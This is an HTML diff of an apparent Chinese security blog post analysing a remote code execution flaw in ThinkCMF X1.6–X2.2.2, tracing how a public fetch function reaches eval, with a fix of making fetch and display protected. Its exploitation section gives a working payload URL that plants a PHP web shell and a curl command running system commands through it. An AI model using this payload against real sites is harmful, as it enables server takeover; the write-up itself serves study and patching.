@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="web,">
 
 
 
@@ -81,16 +81,28 @@
 
 
 
-<meta name="description" content="我的生活，你的梦想。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="chensir`Blog">
-<meta property="og:url" content="http://yoursite.com/archives/2019/10/index.html">
+<meta name="description" content="一、背景ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展。每个应用都能独立的完成自己的任务，也可通过系统调用其他应用进行协同工作。在这种运行机制下，开发商场应用的用户无需关心开发SNS应用时如何工作的，但他们之间又可通过系统本身进">
+<meta name="keywords" content="web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thinkcmf-内容包含漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/10/24/thinkcmf-内容包含漏洞/index.html">
 <meta property="og:site_name" content="chensir`Blog">
-<meta property="og:description" content="我的生活，你的梦想。">
+<meta property="og:description" content="一、背景ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展。每个应用都能独立的完成自己的任务，也可通过系统调用其他应用进行协同工作。在这种运行机制下，开发商场应用的用户无需关心开发SNS应用时如何工作的，但他们之间又可通过系统本身进">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/img/thinkcmf1.png">
+<meta property="og:image" content="http://yoursite.com/img/thinkcmf2.png">
+<meta property="og:image" content="http://yoursite.com/img/thinkcmf3.png">
+<meta property="og:image" content="http://yoursite.com/img/thinkcmf4.png">
+<meta property="og:image" content="http://yoursite.com/img/thinkcmf5.png">
+<meta property="og:image" content="http://yoursite.com/img/thinkcmf6.png">
+<meta property="og:image" content="http://yoursite.com/img/thinkcmf7.png">
+<meta property="og:image" content="http://yoursite.com/img/thinkcmf8.png">
+<meta property="og:image" content="http://yoursite.com/img/thinkcmf9.png">
+<meta property="og:updated_time" content="2019-10-24T11:01:54.890Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="chensir`Blog">
-<meta name="twitter:description" content="我的生活，你的梦想。">
+<meta name="twitter:title" content="thinkcmf-内容包含漏洞">
+<meta name="twitter:description" content="一、背景ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展。每个应用都能独立的完成自己的任务，也可通过系统调用其他应用进行协同工作。在这种运行机制下，开发商场应用的用户无需关心开发SNS应用时如何工作的，但他们之间又可通过系统本身进">
+<meta name="twitter:image" content="http://yoursite.com/img/thinkcmf1.png">
 
 
 
@@ -120,13 +132,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/archives/2019/10/">
+  <link rel="canonical" href="http://yoursite.com/2019/10/24/thinkcmf-内容包含漏洞/">
 
 
 
 
 
-  <title>归档 | chensir`Blog</title>
+  <title>thinkcmf-内容包含漏洞 | chensir`Blog</title>
   
 
 
@@ -145,7 +157,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -281,142 +293,221 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-      <span class="archive-page-counter">
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/24/thinkcmf-内容包含漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="chensir">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/favicon.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="chensir`Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
+          <h1 class="post-title" itemprop="name headline">thinkcmf-内容包含漏洞</h1>
         
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-24T17:08:44+08:00">
+                2019-10-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
           
-        
-        嗯..! 目前共计 3 篇日志。 继续努力。
-      </span>
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
 
-      
-
-        
-        
-        
-
-        
+                
+                
+              
+            </span>
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2019">2019</h1>
-          </div>
-        
-        
 
-        
+          
+            
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/10/24/thinkcmf-内容包含漏洞/" itemprop="url">
-              
-                <span itemprop="name">thinkcmf-内容包含漏洞</span>
-              
-            </a>
-        
-      </h2>
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-10-24T17:08:44+08:00" content="2019-10-24">
-          10-24
-        </time>
-      </div>
+          
 
-    </header>
-  </article>
+          
 
+        </div>
+      </header>
+    
 
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/10/24/cve-2019-11043/" itemprop="url">
-              
-                <span itemprop="name">cve-2019-11043</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-10-24T09:08:31+08:00" content="2019-10-24">
-          10-24
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
+      
+        <h3 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h3><p>ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建。<br>ThinkCMF提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展。<br>每个应用都能独立的完成自己的任务，也可通过系统调用其他应用进行协同工作。在这种运行机制下，开发商场应用的用户无需关心开发SNS应用时如何工作的，但他们之间又可通过系统本身进行协调，大大的降低了开发成本和沟通成本。</p>
+<a id="more"></a>
+<pre><code>官网:http://www.thinkcmf.com</code></pre><h3 id="二、影响版本"><a href="#二、影响版本" class="headerlink" title="二、影响版本"></a>二、影响版本</h3><pre><code>ThinkCMF X1.6.0
 
-        
-        
+ThinkCMF X2.1.0
 
-        
+ThinkCMF X2.2.0
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+ThinkCMF X2.2.1
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/10/22/Gophish/" itemprop="url">
-              
-                <span itemprop="name">Gophish</span>
-              
-            </a>
-        
-      </h2>
+ThinkCMF X2.2.2</code></pre><h3 id="三、漏洞危害"><a href="#三、漏洞危害" class="headerlink" title="三、漏洞危害"></a>三、漏洞危害</h3><p>   远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码。 </p>
+<h3 id="四、漏洞挖掘"><a href="#四、漏洞挖掘" class="headerlink" title="四、漏洞挖掘"></a>四、漏洞挖掘</h3><p>前面都是参考自 <a href="http://www.52bug.cn/hkjs/6139.html" target="_blank" rel="noopener">http://www.52bug.cn/hkjs/6139.html</a></p>
+<p>接下来的内容其实也是大同小异。主要还是想深入分析下具体是如何导致包含的，但是通过参考了两个相关的分析，他们都不告诉我具体是咋回事，到底是哪里包含的，就截图了个fetch函数。</p>
+<p>参考链接：</p>
+<p><a href="http://www.52bug.cn/hkjs/6139.html" target="_blank" rel="noopener">http://www.52bug.cn/hkjs/6139.html</a></p>
+<p><a href="https://xz.aliyun.com/t/3529" target="_blank" rel="noopener">https://xz.aliyun.com/t/3529</a></p>
+<p>上述部分也基本摘抄于其中一个链接的，写这个文章不是为了转载，主要还是想记录下自己分析包含的一个过程，至于为什么为public这个函数救可以被调用且参数可以控制。</p>
+<p>引用于第一个链接：</p>
+<pre><code>ThinkPHP是一套基于MVC的应用程序框架，被分成三个核心部件：模型（M）、视图（V）、控制器（C）。 
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-10-22T14:41:56+08:00" content="2019-10-22">
-          10-22
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+由于添加的代码在控制器中，根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public, 而添加的代码正好符合该条件。 </code></pre><p>这里我们和原文一样从头开始分析。打开我们的index.php可以看到我们项目路径为application</p>
+<p><img src="/img/thinkcmf1.png" alt="img"></p>
+<p>于是和作者一样进入我们的application下的portal下的controller目录中去，我们随意打开一个文件，我这里打开的是application\Portal\Controller、IndexController.class.php</p>
+<p><img src="/img/thinkcmf2.png" alt="2"></p>
+<p>可以看到引用了一个 ”爸爸“类HomebaseController 那么跟过去，这里的确有传说中带有public且函数名为fetch。</p>
+<p><img src="/img/thinkcmf3.png" alt="3"></p>
+<p>这里就是我想说的了。都是直接给个函数就告诉我可以打了。但是我想知道怎么包含呀，于是就想去分析，但是万事开头懒，我有点懒，但是为了学习还是去跟了。</p>
+<p>一开始就是找他继承的“爸爸”到底是谁了。</p>
+<p>看了文件头部：</p>
+<p><img src="/img/thinkcmf4.png" alt="4"></p>
+<p>好吧use那个我不知道怎么找，于是就一上来就问我的室友（野*军司令king威郑）他告诉我下图是php的基类控制器，我的理解吧就是tp的基类控制器吧好像没啥区别，两句话。</p>
+<p>然后告诉我大概在什么位置，于是我就大概的找到了相关的位置如下：</p>
+<p>simplewind\Core\Library\Think\Controller.class.php</p>
+<p>这个文件如图：果然有我们的fetch函数了。</p>
+<p><img src="/img/thinkcmf5.png" alt="5"></p>
+<p>可是，还是没有什么告诉我们是包含啊，继续跟近到同目录下的view.class.php中</p>
+<p>终于这里有我们想要的了。</p>
+<p><img src="/img/thinkcmf6.png" alt="6"></p>
+<p>从代码层面上看，就是content是否为空不空的话再经过一个判断，然后被eval执行。</p>
+<p>那么这里我就直接引用原文的payload了</p>
+<p>payload:<a href="http://127.0.0.1/?a=fetch&amp;content=" target="_blank" rel="noopener">http://127.0.0.1/?a=fetch&amp;content=</a>&lt;?php+file_put_contents(“1.php”,”&lt;?php+@eval(file_get_contents(‘php://input’));”);</p>
+<p>就可以在根目录下1.php中写入内容了</p>
+<p><img src="/img/thinkcmf7.png" alt="7"></p>
+<p>然后可以通过命令请求 curl <a href="http://xxxxxxx/1.php" target="_blank" rel="noopener">http://xxxxxxx/1.php</a> –data “system(‘ipconfig’);”</p>
+<p><img src="/img/thinkcmf8.png" alt="1571914185882"></p>
+<p>也可以通过burp请求：</p>
+<p><img src="/img/thinkcmf9.png" alt="1571914442633"></p>
+<h2 id="六、修复方法"><a href="#六、修复方法" class="headerlink" title="六、修复方法"></a>六、修复方法</h2><pre><code>将 HomebaseController.class.php 和 AdminbaseController.class.php 类中 display 和 fetch 函数的修饰符改为 protected </code></pre><h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><p>野*军司令king威郑<br>第二次编辑，第一次没保存被我踢到关机键真爽。</p>
 
       
-
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/24/cve-2019-11043/" rel="next" title="cve-2019-11043">
+                <i class="fa fa-chevron-left"></i> cve-2019-11043
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -424,6 +515,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -444,8 +539,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -538,6 +642,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、背景"><span class="nav-number">1.</span> <span class="nav-text">一、背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、影响版本"><span class="nav-number">2.</span> <span class="nav-text">二、影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、漏洞危害"><span class="nav-number">3.</span> <span class="nav-text">三、漏洞危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、漏洞挖掘"><span class="nav-number">4.</span> <span class="nav-text">四、漏洞挖掘</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#六、修复方法"><span class="nav-number"></span> <span class="nav-text">六、修复方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#致谢"><span class="nav-number"></span> <span class="nav-text">致谢</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -685,6 +805,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
